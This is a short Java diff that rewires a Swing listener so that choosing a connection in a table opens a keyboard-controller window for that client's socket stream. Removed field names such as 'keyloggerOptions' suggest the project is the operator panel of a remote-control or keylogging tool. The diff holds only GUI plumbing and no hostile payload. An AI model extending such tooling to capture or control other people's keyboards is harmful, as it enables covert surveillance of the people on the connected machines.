@@ -1,6 +1,7 @@
 package GUI.TableUtils.KeyboardController;
 
 import Connections.Streams;
+import GUI.JsGUI;
 import GUI.Main;
 import GUI.TableUtils.Configuration.GetSYS;
 import GUI.TableUtils.KeyboardController.KeyboardControllerGUI;
@@ -8,33 +9,27 @@ import GUI.TableUtils.KeyboardController.KeyboardControllerGUI;
 import javax.swing.*;
 import javax.swing.event.MenuEvent;
 import javax.swing.event.MenuListener;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.net.Socket;
 import java.util.concurrent.ConcurrentHashMap;
 
-public class KeyboardControllerMenuListener implements MenuListener {
+public class KeyboardControllerMenuListener implements ActionListener {
 
-    private final ConcurrentHashMap<Socket, Streams> mapOfConnections;
-    private final JMenuItem[] keyloggerOptions;
+    private final ConcurrentHashMap<Socket, Streams> map;
+    private final JTable table;
+    private final JsGUI mainGUI;
 
-    public KeyboardControllerMenuListener(ConcurrentHashMap<Socket, Streams> mapOfConnections, JMenuItem[] keyloggerOptions) {
-        this.mapOfConnections = mapOfConnections;
-        this.keyloggerOptions = keyloggerOptions;
+    public KeyboardControllerMenuListener(JTable table, ConcurrentHashMap<Socket, Streams> map, JsGUI mainGUI) {
+        this.mainGUI = mainGUI;
+        this.map = map;
+        this.table = table;
     }
 
     @Override
-    public void menuSelected(MenuEvent e) {
-        Streams stream = GetSYS.getStream(mapOfConnections, Main.gui.getConnectionsTable());
+    public void actionPerformed(ActionEvent e) {
+        Streams stream = GetSYS.getStream(map, table);
         assert stream != null;
-        //new KeyboardControllerGUI();
-    }
-
-    @Override
-    public void menuDeselected(MenuEvent e) {
-
-    }
-
-    @Override
-    public void menuCanceled(MenuEvent e) {
-
+        new KeyboardControllerGUI(mainGUI.getMainGUI(), stream);
     }
 }
